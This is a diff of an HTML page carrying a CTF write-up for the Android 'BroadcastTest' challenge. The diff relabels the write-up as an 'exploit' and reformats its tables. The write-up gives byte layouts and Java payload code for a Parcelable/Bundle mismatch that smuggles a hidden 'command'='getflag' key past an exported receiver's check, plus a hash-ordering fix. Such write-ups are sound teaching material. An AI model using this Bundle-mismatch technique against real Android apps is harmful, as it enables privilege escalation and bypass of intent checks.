@@ -160,7 +160,7 @@
     
             <li class="nav-item dropdown d-sm-block d-md-none">
               <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                writeup
+                exploit
               </a>
               <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                 
@@ -214,7 +214,7 @@
           <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
             <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
               <span class="fa fa-dashboard fa-fw mr-3"></span>
-              <span class="menu-collapsed">writeup</span>
+              <span class="menu-collapsed">exploit</span>
               <span class="submenu-icon ml-auto"></span>
             </div>
           </a>
@@ -238,11 +238,11 @@
       <div class="col-10 py-3">
         <article class="markdown-body"><h1 id="broadcasttest"><a class="header-link" href="#broadcasttest"></a>BroadcastTest</h1>
 <h2 id="background"><a class="header-link" href="#background"></a>background</h2>
-<p>We can reverse the apk and find it only have 4 classes: <code>MainActivity$Message</code> and <code>Receiver</code>1-3.
-And <code>MainActivity$Message</code> implement from Parcelable class.
-<code>Receiver1</code> is expoted. It receive global broadcast and send the bundle to <code>Receiver2</code>.
-<code>Receiver2</code> and <code>Recevier3</code> isn&#39;t expoted, so they can only receive broadcasts from this apk.
-The procedure is </p>
+<p>We can reverse the apk and find it only have 4 classes: <code>MainActivity$Message</code> and <code>Receiver</code>1-3.</p>
+<p>and <code>MainActivity$Message</code> implement from Parcelable class.</p>
+<p><code>Receiver1</code> is expoted. It receive global broadcast and send the bundle to <code>Receiver2</code>.</p>
+<p><code>Receiver2</code> and <code>Recevier3</code> isn&#39;t expoted, so they can only receive broadcasts from this apk.</p>
+<p>The procedure is </p>
 <ol class="list">
 <li><code>Receiver1</code> receive the data from broadcast, and decode it by base64, then marshall it to a bundle, and send it as a broadcast to <code>Receiver2</code>.</li>
 <li><code>Receiver2</code> check the &quot;command&quot;, assert value != &#39;getflag&#39;, then send it to <code>Receiver3</code>.</li>
@@ -325,7 +325,7 @@ bundle.writeToParcel(testData, <span class="hljs-number">0</span>);
 <span class="hljs-keyword">byte</span>[] raw = testData.marshall();</code></pre><p class="img-container"><img src="./1.png" alt=""></p>
 <p><code>writeString</code>will put &#39;\0&#39; to the end of string. 
 PAD_SIZE will make the length of unit be the multipiles of 4.</p>
-<h2 id="writeup"><a class="header-link" href="#writeup"></a>Writeup</h2>
+<h2 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h2>
 <p><code>MainActivity$Message</code> is a class implementing from <code>Parceable</code>.
 There are two type-difference:</p>
 <ol class="list">
@@ -339,12 +339,11 @@ So the second type-difference will cover 4 bytes after <code>Message</code> obje
 <p>The intent of this challenge is to hide a key-value pair <code>&#39;command&#39;=&#39;getflag&#39;</code>, and expoes it when second reading.</p>
 <p>The order of bundle is &#39;length of key, content of key, type of value, length of value, content of value&#39;.</p>
 <p>It means that the writing will cover <code>length of key</code> and make the first 4 bytes of origin <code>content of key</code> the new <code>length of key</code>.</p>
-<p>So we can construct this payload:
-Message|len_key|content_key|type_value|len_value|content_value|
+<p>So we can construct this payload:</p>
+<pre class="hljs"><code>Message|len_key|content_key|type_value|len_value|content_value|
 --|--|--|--|--|--|
-pad|15 00 00 00|07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00| 00 00 00 00|03 00 00 00| &quot;pad&quot; |
-pad 15 00 00 00|07 00 00 00| &quot;command&quot; 00 00|00 00 00 00|07 00 00 00|&quot;getflag&quot; 00 00</p>
-<p>The format of string is UTF-16, two bytes every char.
+pad|<span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-string">"pad"</span> |
+pad <span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span></code></pre><p>The format of string is UTF-16, two bytes every char.
 type=0 means <code>VAL_STRING</code>.</p>
 <p>Another need to do is that <code>Receiver2</code> need <code>bundle.getString(&quot;command&quot;)!=null</code>, so we need another key-value pair <code>&#39;command&#39;=&#39;xxx&#39;</code>.</p>
 <p>So one of the payloads is:</p>
@@ -395,60 +394,17 @@ type=0 means <code>VAL_STRING</code>.</p>
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
 a.writeString(<span class="hljs-string">"1"</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>But marshaling shows that fake_key contains 3 zero char after &#39;getflag&#39;. It costs 6 bytes.
 I search it and find that <code>writeString</code> method will put &#39;\0&#39; to the end of string, then pad size.</p>
-<p>But if I remove the zero, writeString(&quot;\7\0command\0\0\0\7\0getflag&quot;), the end zero will at the end. It costs 44 bytes without padding.
-The structure is 
-Message|len_key|content_key|type_value|len_value|content_value|len_key2|content_key2|type_value2|len_value2|content_value2|
+<p>But if I remove the zero, <code>writeString(&quot;\7\0command\0\0\0\7\0getflag&quot;)</code>, the end zero will be at the end. It costs 44 bytes without padding.
+The structure is </p>
+<pre class="hljs"><code>Message|len_key|content_key|type_value|len_value|content_value|len_key2|content_key2|type_value2|len_value2|content_value2|
 --|--|--|--|--|--|--|--|--|--|--|
-pad|15 00 00 00|07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00| 00 00 00 00|01 00 00 00| &quot;1&quot; | 07 00 00 00 | &quot;command&quot; | 00 00 00 00| 00 00 00 00 | null
-pad 15 00 00 00|07 00 00 00| &quot;command&quot; 00 00|00 00 00 00|07 00 00 00|&quot;getflag&quot; 00 00 | 00 00 00 00 | 01 00 00 00 | &quot;1&quot; | 07 00 00 00 | &quot;command&quot;</p>
-<p>We can find the <code>type_value2</code> is error.
+pad|<span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-string">"1"</span> | <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-string">"command"</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | null
+pad <span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-string">"1"</span> | <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-string">"command"</span></code></pre><p>We can find the <code>type_value2</code> is error.
 So we need to construct <code>fake_value1=&quot;&quot;</code>.</p>
-<table>
-<thead>
-<tr>
-<th>Message</th>
-<th>len_key</th>
-<th>content_key</th>
-<th>type_value</th>
-<th>len_value</th>
-<th>content_value</th>
-<th>len_key2</th>
-<th>content_key2</th>
-<th>type_value2</th>
-<th>len_value2</th>
-<th>content_value2</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pad</td>
-<td>15 00 00 00</td>
-<td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
-<td>00 00 00 00</td>
-<td>00 00 00 00</td>
-<td>00 00 00 00</td>
-<td>07 00 00 00</td>
-<td>&quot;command&quot;</td>
-<td>00 00 00 00</td>
-<td>00 00 00 00</td>
-<td>null</td>
-</tr>
-<tr>
-<td>pad 15 00 00 00</td>
-<td>07 00 00 00</td>
-<td>&quot;command&quot; 00 00</td>
-<td>00 00 00 00</td>
-<td>07 00 00 00</td>
-<td>&quot;getflag&quot; 00 00</td>
-<td>00 00 00 00</td>
-<td>00 00 00 00</td>
-<td>00 00 00 00</td>
-<td>07 00 00 00</td>
-<td>&quot;command&quot;</td>
-</tr>
-</tbody>
-</table>
-<p>This is the payload2:</p>
+<pre class="hljs"><code>Message|len_key|content_key|type_value|len_value|content_value|len_key2|content_key2|type_value2|len_value2|content_value2|
+--|--|--|--|--|--|--|--|--|--|--|
+pad|<span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-string">"command"</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | null
+pad <span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>| <span class="hljs-string">"command"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>|<span class="hljs-string">"getflag"</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-string">"command"</span></code></pre><p>This is the payload2:</p>
 <pre class="hljs"><code>a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag"</span>);
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
 a.writeString(<span class="hljs-string">""</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>For validating my suppose, I use payload3:</p>
@@ -461,12 +417,7 @@ I check it and find the order changed:
 <code>&#39;\7\0command...getflag\0\0&#39;=&#39;1&#39;, Message, &#39;command&#39;=&#39;gotflag&#39;</code>
 It means that the payload is correct but it covered <code>&#39;command&#39;=&#39;gotflag&#39;</code>.</p>
 <p>And there is a warning in logcat:</p>
-<blockquote>
-<blockquote>
-<p>W/ArrayMap: New hash -1841832101 is before end of array hash -1212575282 at index 1 key ��command��������getflag����</p>
-</blockquote>
-</blockquote>
-<p>So the question is Bundle use Arraymap, whose order is decisided by hash of key.
+<pre class="hljs"><code>&gt;&gt;W/ArrayMap: New hash -1841832101 is before end of<span class="hljs-built_in"> array </span>hash -1212575282 at index 1 key ��command��������getflag����</code></pre><p>So the question is Bundle use Arraymap, whose order is decisided by hash of key.
 We change the key, so the hash changed.
 It is lower than the hash of key of Message.
 We don&#39;t care it before.
@@ -493,7 +444,7 @@ The value of hash of key is <code>-1841832101</code>, so we just need to find a 
             key += <span class="hljs-string">"."</span>;
         }
         a.writeString(key); <span class="hljs-comment">// key of Message object</span>
-</code></pre><p><a href="./gen_payload.zip">This</a> is a project of AndroidStudio which can generate payload.</p>
+</code></pre><p><a href="./gen_payload.zip">This</a> is a project of AndroidStudio which can generate the exploit payload.</p>
         </article>
       </div>
     </div>
